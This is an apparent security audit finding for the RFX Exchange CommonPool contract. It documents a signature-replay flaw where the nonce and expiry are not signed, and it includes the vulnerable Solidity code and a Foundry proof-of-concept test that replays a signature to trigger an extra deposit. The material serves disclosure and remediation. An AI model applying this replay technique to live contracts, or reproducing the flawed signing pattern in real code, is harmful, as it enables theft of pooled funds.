---
tags:
  - lang/solidity
  - platform/halborn
  - has/github
  - has/poc
  - severity/high
  - sector/vault
protocol: "[[Common Pool]]"
auditors:
  - "[[Halborn]]"
report: "https://www.halborn.com/audits/rfx-exchange/common-pool"
genome:
  - "[[signature-replay]]"
  - "[[direct-drain]]"
  - "[[access-roles]]"
  - "[[account-ownership]]"
  - "[[permit-fork-replay]]"
  - "[[timestamp-dependence]]"
---
# Signature does not take all parameters into account and can be reused

- id: 52006
- impact: HIGH
- protocol: [[Common Pool]]
- reporter: Halborn
- source: https://www.halborn.com/audits/rfx-exchange/common-pool

## Summary


The `allocateFunds` function in the `CommonPool` contract has a flaw where the signature can be reused, allowing anyone to resubmit transactions that were already executed. This can be done by changing the nonce and expiration date in the signature. This allows anyone to manipulate the function and trigger deposits or withdrawals in the RFX contract. The code snippets provided show that the signature only uses the multicall data and does not include the nonce or expiration date. A proof of concept was also provided to demonstrate how this vulnerability can be exploited. The BVSS score for this issue is 9.4, and it is recommended to factor in the nonce and expiration date in the payload to be signed. The issue has been solved by the RFX Exchange team by removing the signature and implementing an access control.

## Details

##### Description

The `CommonPool`'s `allocateFunds` function accepts a Deposit / Withdraw payload and a corresponding signature (it is a structure made of the signature bytes, an expiration date, and a nonce). The expiration date and the nonce are not factored in the payload prior to the signing event. Therefore, it is possible to modify them: the signature bytes and corresponding payload can be reused for different nonce, and resent with different expiry dates.

  

Since the signature can be reused, it means that anyone can resubmit the `allocateFunds` transactions that were already executed, just by finding the signature in the block explorer, and then changing the nonce to fit the `currentNonce` of the `CommonPool`. This flaw allows anyone to play with `allocateFunds`, triggering either or both `createDeposit` or `createWithdrawal` in RFX, depending on the payload that corresponds to the signature that is resubmitted.

  

In the following snippets, we can see that the `_input`, that is used to verify the signature, only uses the multicall data, not including `sig.expiry` and `sig.orderNonce`.

```
/// @notice Checking report has not expired, for current epoch, and signed by approved signer
// NOTE: This logic needs to be internal for tests and private for prod (contract size)
function checkAllReports(
    ICommonPool.WithdrawTx calldata withdraw,
    ICommonPool.DepositTx calldata deposit,
    uint256 orderNonce
) internal view {
    bytes32 input;

    // Checking deposit report if non-empty
    if (deposit.multicall.position.length != 0) {
        input = keccak256(abi.encode(keccak256(bytes(DEPOSIT_STRUCT)), deposit.multicall));
        checkReport(deposit.sig, input, orderNonce);
    }

    // Checking withdraw report if non-empty
    if (withdraw.multicall.position.length != 0) {
        input = keccak256(abi.encode(keccak256(bytes(WITHDRAW_STRUCT)), withdraw.multicall));
        checkReport(withdraw.sig, input, orderNonce);
    }
}

/// @notice Checking the signature for the payload along with timestamp and epoch
// NOTE: This logic needs to be internal for tests and private for prod (contract size)
function checkReport(ICommonPool.Signature calldata sig, bytes32 input, uint256 orderNonce) internal view {
    // Ensures allocation hasn't expired or been used before
    if (block.timestamp > sig.expiry) revert IErrors.InvalidTimestamp();

    // Ensures the allocation being used isn't being re-submitted
    if (sig.nonce != orderNonce) revert IErrors.InvalidEpoch();

    // Checking the signature for the payload
    bytes32 inputHash = constructHash(input);
    if (!ICommonPool(msg.sender).approvedSigner(ECDSA.recover(inputHash, sig.signature))) {
        revert IErrors.InvalidSignature();
    }
}
```

##### Proof of Concept

The following PoC shows that anyone can just modify the `orderNonce` from the signature and submit it again, here ordering a second deposit from the pool to RFX:

```
function test_halborn_commonPool_singleDeposit() public {
    // Approving the signer
    commonPool.updateSigner(accountPkOwner, true);

    // Approving the pool address
    address[] memory _addr = new address[](1);
    bool[] memory _bool = new bool[](1);
    _addr[0] = RFX_BTCUSD_MARKET;
    _bool[0] = true;
    commonPool.updateApprovedExternalAddr(_addr, _bool);

    // Configuring the input for deposit
    ICommonPool.DepositTx memory deposit;
    deposit.multicall = _configureDepositMulticall();
    bytes32 _input = keccak256(abi.encode(keccak256(bytes(rfxHelper.DEPOSIT_STRUCT())), deposit.multicall));

    // Dealing the funds require for the deposit (we deposit 1000e8 per deposit)
    deal(BTC_TOKEN_ARB, address(commonPool), 2000e8);

    ICommonPool.Signature memory depositSig;
    depositSig.expiry = uint128(block.timestamp + 1 days);
    depositSig.nonce = uint128(commonPool.orderNonce());
    (depositSig.signature,) = getSignature(commonPool, _input, accountPk);
    deposit.sig = depositSig;

    // Configuring the input for checkReport - empty withdraw tx
    ICommonPool.WithdrawTx memory withdraw;
    uint256 wntTotal = deposit.multicall.sendWnt[0].amount;

    // Allocating funds
    commonPool.allocateFunds{value: wntTotal}(withdraw, deposit);

    // Asserting the outcomes
    (address[] memory activeMarkets,) = commonPool.currentAllocation();
    assertEq(activeMarkets.length, 1);
    assertEq(activeMarkets[0], RFX_BTCUSD_MARKET);
    assertEq(IERC20(BTC_TOKEN_ARB).balanceOf(address(commonPool)), 2000e8 - deposit.multicall.sendToken[0].amount);
    assertEq(commonPool.orderNonce(), 1);

    // Now alice replays the signature and just changes the orderNonce parameter
    address alice = vm.addr(0x123);
    vm.deal(alice, 10e18); // Give alice some ETH
    vm.startPrank(alice);

    depositSig.nonce = uint128(commonPool.orderNonce());
    commonPool.allocateFunds{value: wntTotal}(withdraw, deposit);

    // This didn't revert so alice could successfully replay the signature and deposit, bypassing the signature protection
    assertEq(activeMarkets.length, 1);
    assertEq(activeMarkets[0], RFX_BTCUSD_MARKET);
    assertEq(IERC20(BTC_TOKEN_ARB).balanceOf(address(commonPool)), 2000e8 - 2 * deposit.multicall.sendToken[0].amount);
    assertEq(commonPool.orderNonce(), 2);
}
```

  

The following figure shows that the signature replay succeeded:

![PoC result](https://halbornmainframe.com/proxy/audits/images/668577212b45f0b0c0cfe78b)

##### BVSS

[AO:A/AC:L/AX:L/R:N/S:C/C:N/A:M/I:N/D:M/Y:M (9.4)](/bvss?q=AO:A/AC:L/AX:L/R:N/S:C/C:N/A:M/I:N/D:M/Y:M)

##### Recommendation

It is recommended to factor `orderNonce` and `expiryDate` in the payload to be signed.

##### Remediation

**SOLVED**: the **RFX Exchange team** solved this issue by getting rid of the signature in favor of an access control on the vulnerable function.

##### Remediation Hash

<https://github.com/relative-finance/common-pool/pull/22/files#r1759597582>
